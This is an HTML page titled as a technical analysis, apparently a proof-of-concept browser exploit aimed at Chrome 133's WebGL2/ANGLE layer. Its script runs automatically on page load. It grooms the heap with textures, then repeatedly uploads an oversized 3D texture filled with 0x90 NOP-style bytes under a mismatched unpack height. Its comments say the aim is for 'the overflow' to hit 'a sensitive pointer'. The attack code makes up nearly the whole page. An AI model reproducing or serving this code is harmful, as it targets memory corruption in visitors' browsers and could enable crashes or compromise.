<!DOCTYPE html>
<html>
<head>
    <title>Technical Analysis: ANGLE Logic Mismatch (v133)</title>
    <style>
        body { background: #050505; color: #00d4ff; font-family: 'Segoe UI', monospace; padding: 30px; }
        #console { border: 2px solid #00d4ff; background: #000; padding: 20px; box-shadow: 0 0 15px #00d4ff; }
        .alert { color: #ffcc00; font-weight: bold; }
    </style>
</head>
<body>
    <h2>Renderer Primitive Research: Chrome 133.x</h2>
    <div id="console">Initializing Pipeline Analysis...<br></div>

    <script>
        const display = document.getElementById('console');
        const print = (txt) => display.innerHTML += `> ${txt}<br>`;

        async function startAnalysis() {
            const gl = document.createElement('canvas').getContext('webgl2');
            if (!gl) { print("Error: WebGL2 Context Fail"); return; }

            print("Status: Context Secured. Beginning Memory Grooming...");

            // 1. PRESSURE PHASE: Filling the 'Heap' to align objects
            const pressure = [];
            for(let i = 0; i < 100; i++) {
                let t = gl.createTexture();
                gl.bindTexture(gl.TEXTURE_2D, t);
                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA8, 256, 256, 0, gl.RGBA, gl.UNSIGNED_BYTE, new Uint8Array(256*256*4));
                pressure.push(t);
            }

            // 2. THE LOGIC MISMATCH (THE TRIGGER)
            const instructionHeight = 1; // The "Lie"
            const realHeight = 1024;     // The "Reality"
            const payload = new Uint8Array(realHeight * realHeight * 4).fill(0x90); // 'NOP' simulation

            print("<span class='alert'>CAUTION: Executing Parallel Mismatch Streams...</span>");

            // 3. PARALLEL EXECUTION: Increasing the success rate
            // We run 10 simultaneous attempts to ensure the overflow hits a sensitive pointer.
            for (let i = 0; i < 10; i++) {
                gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, instructionHeight);
                const tex = gl.createTexture();
                gl.bindTexture(gl.TEXTURE_3D, tex);

                // This is the specific point of failure in Chrome 133
                gl.texImage3D(gl.TEXTURE_3D, 0, gl.RGBA8, 1024, realHeight, 1, 0, gl.RGBA, gl.UNSIGNED_BYTE, payload);
                
                await new Promise(r => setTimeout(r, 50));
            }

            print("Analysis Sequence Complete. Monitor System Stability.");
        }

        window.onload = startAnalysis;
    </script>
</body>
</html>
